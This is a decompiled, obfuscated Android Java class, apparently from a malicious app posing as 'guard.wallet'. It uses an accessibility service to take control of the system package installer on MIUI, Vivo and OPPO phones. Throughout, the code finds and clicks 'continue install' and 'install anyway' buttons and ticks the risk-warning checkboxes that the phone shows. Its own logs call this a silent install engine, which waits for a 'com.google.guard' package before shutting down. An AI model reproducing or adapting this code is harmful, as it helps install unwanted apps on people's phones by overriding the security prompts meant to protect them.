package o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;

public final class x extends e {
   public final ScheduledExecutorService n;
   public final ConcurrentLinkedQueue o;
   public final ReentrantLock p;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public x() {
      super(N(), "com.android.packageinstaller");
      ScheduledExecutorService var4 = Executors.newSingleThreadScheduledExecutor();
      this.n = var4;
      this.o = new ConcurrentLinkedQueue();
      this.p = new ReentrantLock();

      Exception var10000;
      label32: {
         long var1;
         label31: {
            label30: {
               try {
                  if (!com.guard.wallet.utils.e.i() && !com.guard.wallet.utils.e.l()) {
                     break label30;
                  }
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var10001 = false;
                  break label32;
               }

               var1 = 180L;
               break label31;
            }

            var1 = 120L;
         }

         try {
            w var7 = new w(this, 0);
            var4.schedule(var7, var1, TimeUnit.SECONDS);
            return;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var8 = false;
         }
      }

      Exception var3 = var10000;
      a1.q.s("PackageInstallerDelegate", var3);
   }

   public static ListenWindow H() {
      ListenWindow var0 = new ListenWindow("com.android.packageinstaller", "com.android.packageinstaller.PackageInstallerActivity");
      o.b.q(16384, o.b.q(32, o.b.r(var0), var0), var0).add(2048);
      return var0;
   }

   public static CombineFiltersWithOr M() {
      CombineFiltersWithOr var0 = new CombineFiltersWithOr();
      var0.setFilters(new LinkedList<>());
      List var3 = var0.getFilters();
      CombineFilter var1 = new CombineFilter();
      var1.setStringConditions(new LinkedList<>());
      StringCondition var2 = new StringCondition();
      var2.setProperty("text");
      var2.setContains(com.guard.wallet.utils.f.b("MIUI_CONTINUE_INSTALL_BTN_TEXT"));
      var1.getStringConditions().add(var2);
      var3.add(var1);
      List var4 = var0.getFilters();
      CombineFilter var20 = new CombineFilter();
      var20.setStringConditions(new LinkedList<>());
      var2 = new StringCondition();
      var2.setProperty("text");
      var2.setEquals(com.guard.wallet.utils.f.b("VIVO_CONTINUE_INSTALL_BTN_TEXT"));
      var20.getStringConditions().add(var2);
      var4.add(var20);
      var3 = var0.getFilters();
      CombineFilter var13 = new CombineFilter();
      StringCondition var5 = a.a.c(var13, "id", "com.android.packageinstaller:id/confirm_bottom_button_layout");
      var13.getStringConditions().add(var5);
      var3.add(var13);
      List var6 = var0.getFilters();
      CombineFilter var22 = new CombineFilter();
      var22.setStringConditions(new LinkedList<>());
      var2 = new StringCondition();
      var2.setProperty("text");
      var2.setEquals(com.guard.wallet.utils.f.b("OPPO_CONTINUE_INSTALL_BTN_TEXT"));
      var22.getStringConditions().add(var2);
      var6.add(var22);
      List var15 = var0.getFilters();
      CombineFilter var23 = new CombineFilter();
      StringCondition var7 = a.a.c(var23, "id", "com.oplus.appdetail:id/view_bottom_guide_continue_install_btn");
      var23.getStringConditions().add(var7);
      var15.add(var23);
      List var8 = var0.getFilters();
      CombineFilter var24 = new CombineFilter();
      var24.setStringConditions(new LinkedList<>());
      var2 = new StringCondition();
      var2.setProperty("text");
      var2.setContains(com.guard.wallet.utils.f.b("OPPO_AUTHORIZE_INSTALL_BTN_TEXT"));
      var24.getStringConditions().add(var2);
      var8.add(var24);
      var3 = var0.getFilters();
      CombineFilter var17 = new CombineFilter();
      StringCondition var9 = a.a.b(var17, a.a.c(var17, "className", "android.widget.LinearLayout"), "id", "android:id/button1");
      var17.getStringConditions().add(var9);
      var3.add(var17);
      var3 = var0.getFilters();
      CombineFilter var18 = new CombineFilter();
      StringCondition var10 = a.a.c(var18, "text", "立即安装");
      var18.getStringConditions().add(var10);
      var3.add(var18);
      List var11 = var0.getFilters();
      CombineFilter var27 = new CombineFilter();
      var2 = a.a.c(var27, "text", "仍然安装");
      var27.getStringConditions().add(var2);
      var11.add(var27);
      return var0;
   }

   public static LinkedList N() {
      LinkedList var0 = new LinkedList();
      var0.add(H());
      var0.add(Q());
      var0.add(P());
      var0.add(V());
      var0.add(S());
      var0.add(U());
      var0.add(T());
      return var0;
   }

   public static ListenWindow P() {
      ListenWindow var0 = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.install.AdbInstallActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow Q() {
      ListenWindow var0 = new ListenWindow("com.miui.securitycenter", "miuix.appcompat.app.AlertDialog");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static boolean R() {
      boolean var0;
      if (!com.guard.wallet.utils.e.i() && !com.guard.wallet.utils.e.l() && !com.guard.wallet.utils.e.m()) {
         var0 = false;
      } else {
         var0 = true;
      }

      return var0;
   }

   public static ListenWindow S() {
      ListenWindow var0 = new ListenWindow("com.oplus.appdetail", "com.oplus.appdetail.model.guide.ui.InstallGuideActivity");
      o.b.q(16384, o.b.q(32, o.b.r(var0), var0), var0).add(2048);
      return var0;
   }

   public static ListenWindow T() {
      ListenWindow var0 = new ListenWindow("com.oplus.appdetail", "com.oplus.appdetail.model.finish.InstallFinishActivity");
      o.b.q(16384, o.b.q(32, o.b.r(var0), var0), var0).add(2048);
      return var0;
   }

   public static ListenWindow U() {
      ListenWindow var0 = new ListenWindow("com.android.packageinstaller", "com.android.packageinstaller.oplus.InstallAppProgress");
      o.b.q(16384, o.b.q(32, o.b.r(var0), var0), var0).add(2048);
      return var0;
   }

   public static ListenWindow V() {
      ListenWindow var0 = new ListenWindow("com.android.packageinstaller", "com.android.packageinstaller.oplus.OPlusPackageInstallerActivity");
      o.b.q(16384, o.b.q(32, o.b.r(var0), var0), var0).add(2048);
      return var0;
   }

   public final boolean I() {
      UiObject var2 = this.k();
      boolean var1 = false;
      if (var2 != null) {
         Log.d("PackageInstallerDelegate", "开始查找允许安装复选框");
         this.k().refresh();
         com.guard.wallet.utils.g.T0(10);
         var2 = this.k();
         CombineFiltersWithOr var3 = new CombineFiltersWithOr();
         var3.setFilters(new LinkedList<>());
         List var5 = var3.getFilters();
         CombineFilter var4 = new CombineFilter();
         StringCondition var6 = a.a.c(var4, "id", "com.android.packageinstaller:id/install_risk_tips");
         var4.getStringConditions().add(var6);
         var5.add(var4);
         List var9 = var3.getFilters();
         CombineFilter var14 = new CombineFilter();
         var6 = a.a.c(var14, "id", "com.oplus.appdetail:id/safe_guard_checkbox");
         var14.getStringConditions().add(var6);
         var9.add(var14);
         List var20 = var3.getFilters();
         CombineFilter var15 = new CombineFilter();
         StringCondition var10 = a.a.c(var15, "id", "com.oplus.appdetail:id/risk_check_box");
         var15.getStringConditions().add(var10);
         var20.add(var15);
         var5 = var3.getFilters();
         var4 = new CombineFilter();
         var6 = a.a.c(var4, "id", "om.android.packageinstaller:id/deleted_file_state_cb");
         var4.getStringConditions().add(var6);
         var5.add(var4);
         var5 = var3.getFilters();
         var4 = new CombineFilter();
         var4.setStringConditions(new LinkedList<>());
         var4.setBoolConditions(new LinkedList<>());
         BoolCondition var22 = new BoolCondition("clickable", true, true);
         var4.getBoolConditions().add(var22);
         var6 = new StringCondition();
         var6.setProperty("className");
         var6.setEquals("android.widget.CheckBox");
         var4.getStringConditions().add(var6);
         var5.add(var4);
         List var13 = var3.getFilters();
         CombineFilter var18 = new CombineFilter();
         var18.setStringConditions(new LinkedList<>());
         var18.setBoolConditions(new LinkedList<>());
         BoolCondition var24 = new BoolCondition("checkable", true, true);
         var18.getBoolConditions().add(var24);
         var6 = new StringCondition();
         var6.setProperty("className");
         var6.setEquals("android.widget.Button");
         var18.getStringConditions().add(var6);
         var13.add(var18);
         var2 = var2.findOneByOperateOr(var3);
         if (var2 != null) {
            Log.d("PackageInstallerDelegate", "允许本次安装查找成功");
            if (!var2.checkable()) {
               return var2.click();
            }

            if (!var2.checked()) {
               Log.d("PackageInstallerDelegate", "允许本次安装查找成功，未勾选");
               if (var2.clickable()) {
                  var2.click();
                  com.guard.wallet.utils.g.T0(10);
                  var2.refresh();
                  Log.d("PackageInstallerDelegate", "已点击允许本次安装");
               }

               if (!var2.checked()) {
                  if (var2.clickPosition(var2.centerInScreen().getX(), var2.centerInScreen().getY())) {
                     Log.d("PackageInstallerDelegate", "已通过中心位置点击允许本次安装");
                     com.guard.wallet.utils.g.T0(10);
                     var2.refresh();
                  }

                  if (!var2.checked()) {
                     if (var2.clickPosition(0.05F, 0.5F)) {
                        Log.d("PackageInstallerDelegate", "已通过位置点击允许本次安装");
                        com.guard.wallet.utils.g.T0(10);
                        var2.refresh();
                     }

                     if (!var2.checked()) {
                        if (var2.parent() != null && var2.parent().click()) {
                           Log.d("PackageInstallerDelegate", "已通过位置点击允许本次安装父节点");
                           com.guard.wallet.utils.g.T0(10);
                           var2.refresh();
                        }

                        if (!var2.checked()) {
                           return var1;
                        }
                     }
                  }
               }

               Log.d("PackageInstallerDelegate", "已勾选允许本次安装");
            }

            return true;
         }
      }

      return false;
   }

   public final boolean J() {
      if (this.k() != null) {
         MyAccessibilityService.I(this.k());
         UiObject var1 = this.k().findOneByOperateOr(M());

         for (AtomicInteger var2 = new AtomicInteger(0); var1 == null && var2.incrementAndGet() <= 20; var1 = this.k().findOneByOperateOr(M())) {
            com.guard.wallet.utils.g.T0(5);
         }

         if (var1 != null) {
            com.guard.wallet.utils.g.T0(5);
            if (var1.clickable() && var1.click()) {
               Log.d("PackageInstallerDelegate", "查找并点击继续安装成功");
               return true;
            }

            if (var1.parent() != null && var1.parent().clickable() && var1.parent().click()) {
               Log.d("PackageInstallerDelegate", "查找并点击继续安装成功");
               return true;
            }

            if (var1.click()) {
               Log.d("PackageInstallerDelegate", "查找并点击继续安装成功");
               return true;
            }
         }
      }

      return false;
   }

   public final boolean K() {
      String var8;
      label18: {
         if (this.k() != null) {
            UiObject var2 = this.k();
            CombineFiltersWithOr var1 = new CombineFiltersWithOr();
            var1.setFilters(new LinkedList<>());
            List var5 = var1.getFilters();
            CombineFilter var3 = new CombineFilter();
            StringCondition var4 = a.a.c(var3, "id", "com.android.packageinstaller:id/done_button");
            var3.getStringConditions().add(var4);
            var5.add(var3);
            List var10 = var1.getFilters();
            CombineFilter var13 = new CombineFilter();
            StringCondition var15 = a.a.c(var13, "id", "com.oplus.appdetail:id/launch_button");
            var13.getStringConditions().add(var15);
            var10.add(var13);
            List var11 = var1.getFilters();
            CombineFilter var16 = new CombineFilter();
            var16.setStringConditions(new LinkedList<>());
            var4 = new StringCondition();
            var4.setProperty("text");
            var4.setEquals(com.guard.wallet.utils.f.b("OPPO_INSTALL_FINISH_TEXT"));
            var16.getStringConditions().add(var4);
            var11.add(var16);
            UiObject var6 = var2.findOneByOperateOr(var1);
            if (var6 != null && var6.click()) {
               var8 = "查找并点击完成安装完成";
               break label18;
            }

            var2 = this.k();
            var3 = new CombineFilter();
            var3.setStringConditions(new LinkedList<>());
            StringCondition var7 = new StringCondition();
            var7.setProperty("text");
            var7.setContains(com.guard.wallet.utils.f.b("OPPO_INSTALL_DONE_TEXT"));
            var3.getStringConditions().add(var7);
            if (var2.findOneByCombine(var3) != null) {
               var8 = "安装完成查找成功";
               break label18;
            }
         }

         return false;
      }

      Log.d("PackageInstallerDelegate", var8);
      return true;
   }

   // $VF: Irreducible bytecode was duplicated to produce valid code
   public final void L() {
      ReentrantLock var4 = this.p;
      if (var4.tryLock()) {
         AtomicInteger var5 = new AtomicInteger(0);
         boolean var1;
         x var3;
         if (com.guard.wallet.utils.g.d0("com.google.guard") != null) {
            var1 = true;
            var3 = this;
         } else {
            var1 = false;
            var3 = this;
         }

         while (!var1 && var5.incrementAndGet() <= 20) {
            com.guard.wallet.utils.g.T0(2);
            if (com.guard.wallet.utils.g.d0("com.google.guard") != null) {
               var1 = true;
               var3 = var3;
            } else {
               var1 = false;
               var3 = var3;
            }
         }

         if (var1) {
            var3.W();
         }

         var4.unlock();
      }
   }

   public final boolean O() {
      if (this.k() != null) {
         MyAccessibilityService.I(this.k());
         UiObject var4 = this.k();
         CombineFiltersWithOr var5 = new CombineFiltersWithOr();
         var5.setFilters(new LinkedList<>());
         List var2 = var5.getFilters();
         CombineFilter var1 = new CombineFilter();
         var1.setStringConditions(new LinkedList<>());
         StringCondition var3 = new StringCondition();
         var3.setProperty("text");
         var3.setPrefix(com.guard.wallet.utils.f.b("OPPO_INSTALLING_TEXT"));
         var1.getStringConditions().add(var3);
         var2.add(var1);
         if (var4.findOneByOperateOr(var5) != null) {
            Log.d("PackageInstallerDelegate", "正在安装节点查找成功");
            return true;
         }
      }

      return false;
   }

   public final void W() {
      Log.d("PackageInstallerDelegate", "准备结束静默安装自动化引擎");
      if (MyAccessibilityService.P() != null) {
         MyAccessibilityService.P().A();
         MyAccessibilityService.P().u();
      }

      this.n.shutdownNow();
      com.guard.wallet.thread.l.a(super.c);
      this.o.clear();
      if (com.guard.wallet.utils.g.F0(2)) {
         com.guard.wallet.utils.g.T0(5);
      }

      com.guard.wallet.helper.g.c();
      super.d();
      Log.d("PackageInstallerDelegate", "已结束静默安装自动化引擎");
   }

   @Override
   public final void d() {
      try {
         this.n.shutdownNow();
         com.guard.wallet.thread.l.a(super.c);
         this.o.clear();
         super.d();
      } catch (Exception var2) {
         a1.q.s("PackageInstallerDelegate", var2);
      }
   }

   @Override
   public final boolean equals(Object var1) {
      return var1 instanceof x;
   }

   @Override
   public final int hashCode() {
      return Objects.hash(x.class.getName());
   }

   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      super.u(var1, var2, var3);
      boolean var6 = this.q(Collections.singletonList(H()));
      boolean var5 = false;
      boolean var4;
      if (var6) {
         Log.d("PackageInstallerDelegate", "已进入通用安装引导窗口");
         var4 = true;
      } else {
         var4 = false;
      }

      var2 = super.c;
      ConcurrentLinkedQueue var13 = this.o;
      if (var4) {
         var13.remove("miuiDialogInstallMatch");
         var13.remove("oplusInstallMatch");
         var13.remove("commonDialogInstallMatch");
         var13.remove("oplusInstallDoneMatch");
         if (!var13.contains("commonInstallMatch")) {
            var13.add("commonInstallMatch");
            w var7;
            if (com.guard.wallet.utils.e.l()) {
               var7 = new w(this, 1);
            } else {
               var7 = new w(this, 2);
            }

            com.guard.wallet.thread.l.c(var7, var2);
         }
      }

      LinkedList var8 = new LinkedList();
      var8.add(Q());
      var8.add(P());
      if (this.q(var8)) {
         Log.d("PackageInstallerDelegate", "已进入MIUI安装引导对话框");
         var4 = true;
      } else {
         var4 = false;
      }

      if (var4) {
         var13.remove("commonInstallMatch");
         var13.remove("oplusInstallMatch");
         var13.remove("commonDialogInstallMatch");
         var13.remove("oplusInstallDoneMatch");
         if (!var13.contains("miuiDialogInstallMatch")) {
            var13.add("miuiDialogInstallMatch");
            com.guard.wallet.thread.l.c(new w(this, 3), var2);
         }
      }

      ListenWindow var9 = new ListenWindow(null, "android.app.AlertDialog");
      o.b.q(32, o.b.r(var9), var9).add(16384);
      if (this.q(Collections.singletonList(var9))) {
         Log.d("PackageInstallerDelegate", "已进入通用安装引导对话框");
         var4 = true;
      } else {
         var4 = false;
      }

      if (var4) {
         var13.remove("commonInstallMatch");
         var13.remove("miuiDialogInstallMatch");
         var13.remove("oplusInstallMatch");
         var13.remove("oplusInstallDoneMatch");
         if (!var13.contains("commonDialogInstallMatch")) {
            var13.add("commonDialogInstallMatch");
            com.guard.wallet.thread.l.c(new w(this, 4), var2);
         }
      }

      LinkedList var10 = new LinkedList();
      var10.add(V());
      var10.add(S());
      if (this.q(var10)) {
         Log.d("PackageInstallerDelegate", "已进入OPPO安装引导窗口");
         var4 = true;
      } else {
         var4 = false;
      }

      if (var4) {
         com.guard.wallet.thread.l.c(new w(this, 5), var2);
      }

      LinkedList var11 = new LinkedList();
      var11.add(U());
      var11.add(T());
      var4 = var5;
      if (this.q(var11)) {
         Log.d("PackageInstallerDelegate", "已进入OPPO安装完成窗口");
         var4 = true;
      }

      if (var4) {
         com.guard.wallet.thread.l.c(new w(this, 6), var2);
      }
   }
}
